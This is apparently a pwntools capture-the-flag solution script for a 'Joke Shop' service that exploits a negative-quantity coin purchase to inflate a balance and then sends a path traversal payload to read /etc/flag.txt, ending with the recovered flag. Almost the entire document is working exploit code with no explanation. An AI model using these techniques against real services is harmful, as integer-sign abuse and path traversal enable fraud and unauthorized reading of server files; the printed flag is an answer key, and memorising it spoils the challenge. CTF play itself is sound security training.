#!/usr/bin/python3

from pwn import *

target = remote('game.ctf.ae', 3000)

# print(target.recvuntil(b'Enter choice: ').decode())
info('WELCOME TO JOKE SHOP 💫')
warning('Coin : 0$')

target.send(b'1')
info('Go to the Joke buying section 🚶')

# print(target.recvuntil(b'Enter choice: ').decode())
info('Select Joke coins buy option 🏦')

target.send(b'4')

# print(target.recvuntil(b'How many JokeCoins would you like to buy?: ').decode())
warning('Hijacking Joke coins buy option 👾')

target.send(b'-376736573677')
info('Got 376736573677$ 🤑')

# print(target.recvuntil(b'Enter choice: ').decode())
info('Let\'s go to the Pro Mode section 😎')

target.send(b'4')

# print(target.recvuntil(b'Enter the name of the joke you would like to see: ').decode())
info("Entering the payload 💣")

payload = '../../../../../etc/flag.txt'

target.send(payload.encode())
# print(payload.encode())

print(target.recvline_contains(b'CTFAE').decode() + ' 👑')

target.send(b'5')
target.close()
# print(target.recvall().decode())

#! FLAG : CTFAE{FreeJokesForEveryone}